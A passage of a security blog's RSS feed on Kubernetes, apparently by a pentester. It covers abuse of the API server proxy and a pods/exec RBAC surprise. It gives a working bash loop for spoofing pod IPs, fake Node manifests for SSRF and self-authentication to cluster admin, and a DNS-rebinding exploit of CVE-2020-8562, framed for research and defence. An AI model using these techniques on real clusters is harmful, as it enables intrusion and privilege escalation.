&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;lastUpdated&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2025-01-18 07:58:53.413049689 +0000 UTC m=+930.365308647&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;currentTime&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2025-01-18 07:58:53.413049689 +0000 UTC m=+930.365308647&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;nodeEligible&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;security-controls&quot;&gt;Security Controls&lt;/h2&gt;

&lt;p&gt;Obviously this is a fairly powerful feature and not something you’d want to give to just anyone, so what rights do you need and what restrictions are there on its use?&lt;/p&gt;

&lt;p&gt;The user making use of the proxy requires rights to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proxy&lt;/code&gt; sub-resource of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pods&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nodes&lt;/code&gt; (N.B. Providing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;node/proxy&lt;/code&gt; rights also allows use of the Kubelet APIs more dangerous features).&lt;/p&gt;

&lt;p&gt;Additionally there is a check in the API server source code which looks to stop users of this feature from reaching localhost or link-local (e.g. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;169.254.169.254&lt;/code&gt;) addresses. The function &lt;a href=&quot;https://github.com/kubernetes/kubernetes/blob/master/pkg/registry/core/node/strategy.go#L272&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;isProxyableHost&lt;/code&gt;&lt;/a&gt; uses the golang function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;isGlobalUnicast&lt;/code&gt; to check if it’s ok to proxy the requests.&lt;/p&gt;

&lt;h2 id=&quot;bypasses-and-limitations&quot;&gt;Bypasses and limitations&lt;/h2&gt;

&lt;p&gt;Now we’ve described a bit about how this feature is used and secured, let’s get on to the fun part, how can it be (mis)used :)&lt;/p&gt;

&lt;p&gt;Obviously a server service that lets us proxy requests, is effectively SSRF by design, so it seems likely that there’s are some interesting ways we can use it.&lt;/p&gt;

&lt;h3 id=&quot;proxying-to-addresses-outside-the-cluster&quot;&gt;Proxying to addresses outside the cluster&lt;/h3&gt;

&lt;p&gt;One thing that might be handy if you’re a pentester or perhaps CTF player is being able to use the API server’s network position to get access to other hosts on restricted networks. To do that we’d need to be able to tell the API server proxy to direct traffic to arbitrary IP addresses rather than just pods and nodes inside the cluster.&lt;/p&gt;

&lt;p&gt;For this we’ll go to a Kinvolk &lt;a href=&quot;https://kinvolk.io/blog/2019/02/abusing-kubernetes-apiserver-proxying&quot;&gt;blog post from 2019&lt;/a&gt;, as this technique works fine in 2025!&lt;/p&gt;

&lt;p&gt;Essentially, if you own a pod resource you can overwrite the IP address that it has in its status and then proxy to that IP address. It’s a little tricky as the Kubernetes cluster will spot this change as a mistake and will change it back to the valid IP address, so you have to loop the requests to keep it set to the value you want.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-euo&lt;/span&gt; pipefail

&lt;span class=&quot;nb&quot;&gt;readonly &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8001
&lt;span class=&quot;nb&quot;&gt;readonly &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;POD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;echoserver
&lt;span class=&quot;nb&quot;&gt;readonly &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TARGETIP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1.1.1.1

&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
  &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Content-Type: application/json&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;http://localhost:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/api/v1/namespaces/default/pods/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;POD&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/status&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;POD&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-orig.json&quot;&lt;/span&gt;

  &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$POD&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-orig&lt;/span&gt;.json |
    &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;s/&quot;podIP&quot;: &quot;.*&quot;,/&quot;podIP&quot;: &quot;&apos;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TARGETIP&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&quot;,/g&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;POD&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-patched.json&quot;&lt;/span&gt;

  curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Content-Type:application/merge-patch+json&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; PATCH &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;@&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;POD&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-patched.json&quot;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;s2&quot;&gt;&quot;http://localhost:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/api/v1/namespaces/default/pods/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;POD&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/status&quot;&lt;/span&gt;

  &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;POD&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-orig.json&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;POD&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-patched.json&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With this script looping, you can make a request like&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://127.0.0.1:8001/api/v1/namespaces/default/pods/echoserver/proxy/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and you’ll get the response from the Target IP (in this case 1.1.1.1)&lt;/p&gt;

&lt;h3 id=&quot;fake-node-objects&quot;&gt;Fake Node objects&lt;/h3&gt;

&lt;p&gt;Another route to achieving this goal can be to create fake node objects in the cluster (assuming you’ve got the rights to do that). How well this one works depends a bit on the distribution as some will quickly clean up any fake nodes that are created, but it works fine in vanilla Kubernetes.&lt;/p&gt;

&lt;p&gt;What’s handy here is that we can use hostnames instead of just IP addresses so something like&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Node&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;fakegoogle&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;addresses&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;www.google.com&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Hostname&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Will then allow us to issue a curl request like&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://127.0.0.1:8001/api/v1/nodes/http:fakegoogle:80/proxy/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and get a response from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.google.com&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;getting-the-api-server-to-authenticate-to-itself&quot;&gt;Getting the API Server to authenticate to itself&lt;/h3&gt;

&lt;p&gt;An interesting variation on this idea was noted in the Kubernetes 1.24 Security audit and is currently still an &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/119270&quot;&gt;open issue&lt;/a&gt; so exploitable. This builds on the idea of a fake node by adding additional information to say that the kubelet port on this node is the same as the API server’s port. This causes the API server to authenticate to itself and allows someone with create node and node proxy rights to escalate to full cluster admin.&lt;/p&gt;

&lt;p&gt;A YAML like this&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Node&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;kindserver&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;addresses&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;172.20.0.3&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ExternalIP&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;daemonEndpoints&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;kubeletEndpoint&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;Port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;6443&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;can be applied and then curl commands like the one below get access to the API server&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://127.0.0.1:8001/api/v1/nodes/https:kindserver:6443/proxy/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;cve-2020-8562---bypassing-the-blocklist&quot;&gt;CVE-2020-8562 - Bypassing the blocklist&lt;/h3&gt;

&lt;p&gt;Another point to note about the API server proxy is that it might be possible to bypass the blocklist that’s in place via a known, but unpatchable, CVE (There’s a great blog with details on the original CVE from the reporter &lt;a href=&quot;https://business.blogthinkbig.com/kubernetes-vulnerability-discovered-allows-access-restricted-networks-cve-2020-8562/&quot;&gt;here&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;There is a TOCTOU vulnerability in the API servers blocklist checking that means, if you can make requests to an address you control via the API server proxy, you might be able to get the request to go to IP addresses like localhost or the cloud metadata service addresses like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;169.254.169.254&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/CVE-2020-8562.png&quot; alt=&quot;CVE-2020-8562&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Exploiting this one takes a couple of steps. Firstly we can use a fake node object, as described in the previous section, then we’ll need a DNS service that resolves to different IP addresses alternately.&lt;/p&gt;

&lt;p&gt;Fortunately for us, there’s an existing service we can use for the rebinding, https://lock.cmpxchg8b.com/rebinder.html.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Node&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rebinder&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;addresses&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;2d21209c.7f000001.rbndr.us&lt;/span&gt; 
    &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Hostname&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With that created we can use the URL below to try and access the configuration of the kube-proxy component which is only listening on localhost.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://127.0.0.1:8001/api/v1/nodes/http:rebinder:10249/proxy/configz
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As this is a TOCTOU it can take quite a few attempts to get a response. You should see 3 possibilities. firstly a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;400&lt;/code&gt; response which happens when the blocklist check fails. Secondly a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;503&lt;/code&gt; response where it goes to the external address (in this case the IP address for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanme.nmap.org&lt;/code&gt;) and doesn’t get a response on that URL, and lastly when the TOCTOU is successful you’ll get the response back from the proxy service. I generally have found that &amp;lt; 30 requests is needed for a “hit” using this technique.&lt;/p&gt;

&lt;p&gt;One place where this particular technique is interesting is obviously cloud hosted Kubernetes clusters, and in particular managed providers where they probably don’t want cluster operators requesting localhost interfaces on machines they control :)&lt;/p&gt;

&lt;p&gt;To mitigate this many of the ones I’ve looked at use &lt;a href=&quot;https://kubernetes.io/docs/tasks/extend-kubernetes/setup-konnectivity/&quot;&gt;Konnectivity&lt;/a&gt; which is &lt;em&gt;yet another&lt;/em&gt; proxy and can be configured to ensure that any requests that come in from user controlled addresses are routed back to the node network and away from the control plane network.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;The Kubernetes API server proxy is a handy feature for a number of reasons but obviously making any service a proxy is a tricky proposition from a security standpoint.&lt;/p&gt;

&lt;p&gt;If you’re a cluster operator it’s important to be very careful with who you provide proxy rights to, and if you’re considering creating a managed Kubernetes service where you don’t want cluster owners to have access to the control plane, you’re going to need to be very careful with network firewalling and ensuring that the proxy doesn’t let them get to areas that should be restricted!&lt;/p&gt;
</description>
				<pubDate>Sat, 18 Jan 2025 10:00:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2025/01/18/Exploring-the-Kubernetes-API-Server-Proxy/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2025/01/18/Exploring-the-Kubernetes-API-Server-Proxy/</guid>
			</item>
		
			<item>
				<title>When is read-only not read-only?</title>
				<description>&lt;p&gt;Bit of a digression from the network series today, to discuss something I just saw in passing which is an interesting example of a possible sharp corner/foot gun in Kubernetes RBAC.&lt;/p&gt;

&lt;p&gt;Generally speaking for REST style APIs &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; requests are read-only, so shouldn’t change the state of resources or execute commands. As such you might think that giving a user the following rights in Kubernetes would essentially just be giving them read-only access to pod information in the default namespace.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io/v1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Role&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;pod-reader&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;default&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;apiGroups&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;resources&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pods&quot;&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pods/log&quot;&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pods/status&quot;&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pods/exec&quot;&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pods/attach&quot;&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pods/portforward&quot;&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;verbs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;get&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;list&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;watch&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However due to the details of how Websockets works with Kubernetes, this access &lt;em&gt;can&lt;/em&gt; allow for users to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl exec&lt;/code&gt; commands in pods and get command execution rights in that namespace! There’s information on the origins of this in &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/78741&quot;&gt;this Github issue&lt;/a&gt; but it’s essentially down to how websockets works.&lt;/p&gt;

&lt;p&gt;What’s possibly more interesting is that, while this behaviour has been in place for a while you might not have noticed it, as the default in Kubernetes was to use &lt;a href=&quot;https://en.wikipedia.org/wiki/SPDY&quot;&gt;SPDY&lt;/a&gt; for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec&lt;/code&gt; commands instead of websockets, until Kubernetes version 1.31. So if a user with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; rights on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pods/exec&lt;/code&gt; tried to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl exec&lt;/code&gt; in 1.29 you’d get an error like this&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Error from server (Forbidden): pods &quot;test&quot; is forbidden: User &quot;bob&quot; cannot create resource &quot;pods/exec&quot; in API group &quot;&quot; in the namespace &quot;default&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;but if a user with the exact same rights, tried the same command in Kubernetes 1.31 it works!&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl --kubeconfig bob.config exec -it test -- /bin/bash
bash-5.1# exit
exit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s worth noting that, whilst it’s easier to do now, using websockets with these rights has been possible for a long time using tools like &lt;a href=&quot;https://github.com/jpts/kubectl-execws&quot;&gt;kubectl-execws&lt;/a&gt; from &lt;a href=&quot;https://hachyderm.io/@jpts&quot;&gt;jpts&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Kubernetes RBAC has some tricky areas where the behaviour you get might not be exactly what you expect, and sometimes as in this case, those unexpected behaviours are not very apparent!&lt;/p&gt;
</description>
				<pubDate>Mon, 11 Nov 2024 12:00:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2024/11/11/When-Is-Read-Only-Not-Read-Only/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2024/11/11/When-Is-Read-Only-Not-Read-Only/</guid>
			</item>
		
			<item>
				<title>Exploring A Basic Kubernetes Network Plugin</title>
